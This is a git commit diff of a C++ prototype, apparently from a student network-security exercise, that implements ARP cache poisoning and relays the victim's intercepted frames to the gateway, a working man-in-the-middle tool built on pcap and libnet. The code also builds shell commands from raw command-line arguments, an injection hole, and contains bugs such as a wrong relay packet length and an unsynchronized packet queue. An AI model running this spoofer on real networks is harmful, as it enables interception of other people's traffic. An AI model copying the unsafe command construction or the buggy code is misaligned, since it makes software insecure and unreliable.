6180b6b5a23a9fee7fd5f6fb4bf491d4327acd12
SHJ <aa753@knu.ac.kr>
2023-08-12 04:58:07 +0900

    proto type

--- src/main.cpp
+++ src/main.cpp
@@ -15,6 +15,7 @@
 #include <thread>
 #include <chrono>
 #include <libnet.h>
+#include <queue>
 
 using namespace std;
 
@@ -70,34 +71,40 @@ void macFstr(string strMac, MAC &mac){
 }
 
 
-string getMymac(string inter) {
+void getMymac(string inter, MAC &mac) {
     string command = "ifconfig " + inter;
     string output = cmd(command);
     istringstream iss(output);
 
     string line;
-
+    //MAC mac;
     while (getline(iss, line)) {
         auto pos = line.find("ether ");
         if (pos != string::npos) {
-            MAC mac;
+            
             string macT = line.substr(pos + 6, 17);
-            //macFstr(macT, mac);
+            macFstr(macT, mac);
             //return macFstr(mac);
-            return macT;
+            //return mac;
         }
 
     }
-    return "";
+    //return mac;
 }
 
-string getVmac(string vip) {
+string getSmac(string sip, MAC &mac) {
     //MAC mac;
-    string command = "arp -n " + vip + " | awk '/" + vip + "/ {print $3}' ";
+    string command = "arp -n " + sip + " | awk '/" + sip + "/ {print $3}' ";
     string output = cmd(command);
     //mac=macFstr(output);    
-    //macFstr(output, mac);
+    macFstr(output, mac);
     return output;
+}
+
+void getTmac(string tip, MAC &mac) {
+    string command = "arp -n " + tip + " | awk '/" + tip + "/ {print $3}' ";
+    string output = cmd(command);
+    macFstr(output, mac);
 }
 
 void arpSpoof(string senderIp, string targetIp, string inter) { 
@@ -106,11 +113,13 @@ void arpSpoof(string senderIp, string targetIp, string inter) {
     //string arpUp = "sudo arping -c 3 " + senderIp; 
     //cmd(arpUp);
 
-    string smac=getVmac(senderIp); //sender mac 받아오기
-    string mymac = getMymac(inter); //Attacker mac(나)
+    MAC smac;
+    getSmac(senderIp, smac); //sender mac 받아오기
+    MAC mymac;
+    getMymac(inter, mymac); //Attacker mac(나)
 
-    packet.eth_.dmac_ = Mac(smac);
-    packet.eth_.smac_ = Mac(mymac);
+    packet.eth_.dmac_ = smac;//Mac(smac);
+    packet.eth_.smac_ = mymac;//Mac(mymac);
     packet.eth_.type_ = htons(EthHdr::Arp);
 
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -118,10 +127,10 @@ void arpSpoof(string senderIp, string targetIp, string inter) {
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
     packet.arp_.op_ = htons(ArpHdr::Request);
-    packet.arp_.smac_ = Mac(mymac);
-    packet.arp_.sip_ = htonl(Ip(targetIp)); //gateway ip
-    packet.arp_.tmac_ = Mac(smac);
-    packet.arp_.tip_ = htonl(Ip(senderIp)); //victim ip
+    packet.arp_.smac_ = mymac;//Mac(mymac);
+    packet.arp_.sip_ = htonl(Ip(targetIp)); //targetIp
+    packet.arp_.tmac_ = smac;//Mac(smac);
+    packet.arp_.tip_ = htonl(Ip(senderIp)); //senderIp
 
     const char* dev = inter.c_str();
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -137,41 +146,20 @@ void arpSpoof(string senderIp, string targetIp, string inter) {
 
     pcap_close(handle);
 }
-
+queue<const u_char*> packets;
 void packetHandler(u_char* userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
-    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
+    //struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
   
-    struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + 14);
-    char src_ip_str[INET_ADDRSTRLEN];
-    inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip_str, INET_ADDRSTRLEN);
-    
-    string str="192.168.35.73";
-    char sip[INET_ADDRSTRLEN];
-    strcpy(sip, str.c_str());
-
-    u_int8_t m1[ETHER_ADDR_LEN] = {0x58, 0x1C, 0xF8, 0xF3, 0xF7, 0xEB};
-    u_int8_t m2[ETHER_ADDR_LEN] = {0x00, 0x23, 0xAA, 0x44, 0xB2, 0x98};
-    //if(string(src_ip_str)==str)
-    if(!strcmp(sip, src_ip_str)){
-        cout << "Source IP: " << src_ip_str << endl;
-        std::memcpy(eth_hdr->ether_shost, m1, ETHER_ADDR_LEN);
-        std::memcpy(eth_hdr->ether_dhost, m2, ETHER_ADDR_LEN);
-    }
-
-    const char* dev = "eth0";//inter.c_str();
-    char errbuf[PCAP_ERRBUF_SIZE];
-    
-    pcap_t* handle = pcap_create(dev, errbuf);  
-    pcap_activate(handle);//핸들 활성화.
-    int res = pcap_sendpacket(handle, packet, pkthdr->len);
-    if (res != 0)
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-        
-
-    pcap_close(handle);
+    //struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + 14);
+    //char src_ip_str[INET_ADDRSTRLEN];
+    //char dst_ip_str[INET_ADDRSTRLEN];
+    //inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip_str, INET_ADDRSTRLEN);
+    //inet_ntop(AF_INET, &(ip_hdr->ip_dst), dst_ip_str, INET_ADDRSTRLEN);
+    packets.push(packet);
+    cout<<"put one packet to queue"<<endl;
 }
 
-void Listen(string inter) { //스레드2, ip로 필터 걸고 relay호출할것 or 리턴하고 메인에서 릴레이. getSpoofed()
+void Listen(string inter, string smac) { //스레드2, ip로 필터 걸고 relay호출할것 or 리턴하고 메인에서 릴레이. getSpoofed()
     //LnR (리슨 앤 릴레이)
     const char* dev = inter.c_str();
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -180,85 +168,94 @@ void Listen(string inter) { //스레드2, ip로 필터 걸고 relay호출할것 
     if (handle == nullptr) {
         std::cerr << "Couldn't open interface eth0: " << errbuf << std::endl;
     }
+    string str = "ether src host ";
+    str+=smac;
+    cout<<str<<endl;
+    const char* filter = str.c_str();
+    //char filter[100]; // Adjust the buffer size as needed
+    //nprintf(filter, sizeof(filter), "ether src host %s", smac);
+
+    struct bpf_program fp;
+    if (pcap_compile(handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1) {
+        std::cerr << "Could not parse filter " << filter << ": " << pcap_geterr(handle) << std::endl;
+    }
+    if (pcap_setfilter(handle, &fp) == -1) {
+        std::cerr << "Could not install filter " << filter << ": " << pcap_geterr(handle) << std::endl;
+    }
+
     pcap_loop(handle, 0, packetHandler, nullptr);
 
 }
+void relay(char* inter, string senderIP, MAC targetmac, MAC mymac) {
+    //u_int8_t (eth_hdr->ether_shost)
+    //struct in_addr m (IP)
+    const char* dev = inter;//inter.c_str();
+    char errbuf[PCAP_ERRBUF_SIZE];
+
+    pcap_t* handle = pcap_create(dev, errbuf);
+    pcap_activate(handle);//핸들 활성화.
+
+    while (1) {
+        if (packets.empty()) { //느릴경우 main으로 옮길것.
+            this_thread::sleep_for(std::chrono::milliseconds(100));//패킷 큐가 비었을 경우 슬립 1초
+            //cout<<"stay....."<<endl;
+            continue;
+        }
+        else {
+            u_char* packet = (u_char*)packets.front();
+            packets.pop();
+            //cout<<"get one packet"<<endl;
+            struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
+            struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + 14);
+            
+            if (ip_hdr->ip_src.s_addr == htonl(Ip(senderIP))) {//
+                //eth_hdr->ether_shost = mymac;
+                //cout<<"ip is equal"<<endl;
+                memcpy(eth_hdr->ether_shost, mymac, sizeof(MAC));
+                //copy(begin(mymac), end(mymac), begin(eth_hdr->ether_shost));
+                //eth_hdr->ether_dhost = targetMac;
+               // copy(begin(targetmac), end(targetmac), begin(eth_hdr->ether_dhost));
+                memcpy(eth_hdr->ether_dhost, targetmac, sizeof(MAC));
+
+                int res = pcap_sendpacket(handle, packet, sizeof(EthArpPacket));//체크해야함
+                if (res != 0)
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                //else
+                    //cout<<"send relay"<<endl;
+            }
+        }
+    }
+
+    pcap_close(handle);
+}
 
 int main(int argc, char* argv[]) {
-    //google::InitGoogleLogging(argv[0]);
-    //FLAGS_log_dir="logs";//LOG(INFO) << "hello world";
-    //memcpy(sip, argv[2], sizeof(argv));
-    //cout<<sip<<endl;
-    if (argc < 4) {
 
-        
+    if (argc < 4) {    
         cout<<"why?"<<endl;
 	    return 0;
     }
+    MAC mac;
+    string smac=getSmac(argv[2], mac);
+    //char* smac=new char[m.size()+1];
+    //strcpy(smac, m.c_str());
+    //=&getSmac(argv[2], mac).c_str();// = new char[getSmac(argv[2], mac).c_str()+1];
+    //strcpy(smac,getSmac(argv[2], mac).c_str());
+    MAC targetmac, mymac;
+    getTmac(argv[3], targetmac); //sender mac 받아오기
+    getMymac(argv[1], mymac); //Attacker mac(나)
 
     thread autoArp(arpSpoof, argv[2], argv[3], argv[1]); //s ip, t ip, interface
-    thread listener(Listen, argv[1]);
+    thread listener(Listen, argv[1], smac);
+    thread relayGo(relay, argv[1], argv[2], targetmac, mymac);
 
     autoArp.detach(); //메인 스레드와 관계없이 돌아감.
     listener.detach();
+    relayGo.detach();
 
     while (true) { //대기 걸어줌
         this_thread::sleep_for(std::chrono::seconds(1));
     }
-/*
-
-    char* dev = argv[1];
-    char errbuf[PCAP_ERRBUF_SIZE];   
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
-
-    if (handle == nullptr) {
-        fprintf(stderr, "couldn't open device %//cmd 창에서 ARP테이블 업데이트s(%s)\n", dev, errbuf);
-        return -1;
-    }
-    //MAC mymac;
-    //getMymac(argv[1], mymac);
-    string mymac=getMymac(argv[1]);
-
-    for (int i = 2; i < argc; i=i+2) {
-        EthArpPacket packet;
-
-	string arpUp = "sudo arping -c 5 " + (string)argv[i];
-        cmd(arpUp);
-
-        //MAC vmac;
-        //getVmac(argv[i], vmac); //victim mac
-
-        st//cmd 창에서 ARP테이블 업데이트ring vmac=getVmac(argv[i]);
-
-        packet.eth_.dmac_ = vmac;//Mac(vmac);
-        packet.eth_.smac_ = mymac;//Mac(mymac);
-        packet.eth_.type_ = htons(EthHdr::Arp);
-
-        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-        packet.arp_.pro_ = htons(EthHdr::Ip4);
-        packet.arp_.hln_ = Mac::SIZE;
-        packet.arp_.pln_ = Ip::SIZE;
-        packet.arp_.op_ = htons(ArpHdr::Request);
-        packet.arp_.smac_ = Mac(mymac);
-        packet.arp_.sip_ = htonl(Ip(argv[i+1])); //gateway ip
-        packet.arp_.tmac_ = Mac(vmac);
-        packet.arp_.tip_ = htonl(Ip(argv[i])); //victim ip
-
-        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-        if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-        }
-
-        pcap_close(handle);
-    }
-    */
-
-
-
-
-
-
-
 
 
 }
